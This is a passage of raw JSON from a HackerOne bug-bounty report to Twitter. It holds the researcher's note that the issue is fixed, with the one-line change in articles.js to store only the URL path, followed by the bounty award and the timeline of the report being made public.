I\u0026#39;m not able to reproduce it anymore.\u003c/p\u003e\n\n\u003cp\u003eI\u0026#39;ve identified the fix in the JavaScript file \u003cstrong\u003earticles.js\u003c/strong\u003e - instead of saving the full URL (\u003ccode\u003elocation.href\u003c/code\u003e), only the value of \u003ccode\u003elocation.pathname\u003c/code\u003e is saved. \u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eu.default.set(\u0026quot;lastArticleHref\u0026quot;, \u0026quot;\u0026quot; + window.location.origin + window.location.pathname)\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","automated_response":false,"created_at":"2017-12-20T17:26:29.721Z","updated_at":"2017-12-20T17:26:29.721Z","actor":{"username":"harisec","cleared":true,"url":"/harisec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/968/7f3126cb24b0dd55034e93fb7e809df7e1000e77_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"twitter","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2241061,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Thanks again for helping us keep Twitter safe and secure for our users!","markdown_message":"\u003cp\u003eThanks again for helping us keep Twitter safe and secure for our users!\u003c/p\u003e\n","automated_response":false,"created_at":"2017-12-21T20:07:09.699Z","updated_at":"2017-12-21T20:07:09.699Z","actor":{"url":"/twitter","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/061/85a63a443f017ad8353de4f68ebf52fdd61c345a_original./eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Twitter"}},"bounty_amount":"1120.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"twitter","collaborator":{"username":"harisec","url":"/harisec"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2394841,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"If it's not a problem, I would like to make this report public. Thanks!","markdown_message":"\u003cp\u003eIf it\u0026#39;s not a problem, I would like to make this report public. Thanks!\u003c/p\u003e\n","automated_response":false,"created_at":"2018-02-17T15:42:35.633Z","updated_at":"2018-02-17T15:42:35.633Z","first_to_agree":true,"actor":{"username":"harisec","cleared":true,"url":"/harisec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/968/7f3126cb24b0dd55034e93fb7e809df7e1000e77_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"twitter","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2427533,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2018-02-24T00:03:54.859Z","updated_at":"2018-02-24T00:03:54.859Z","actor":{"username":"andrewsorensen","cleared":false,"url":"/andrewsorensen","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"twitter","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2427534,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2018-02-24T00:03:54.982Z","updated_at":"2018-02-24T00:03:54.982Z","actor":{"username":"andrewsorensen","cleared":false,"url":"/andrewsorensen","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"twitter","actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}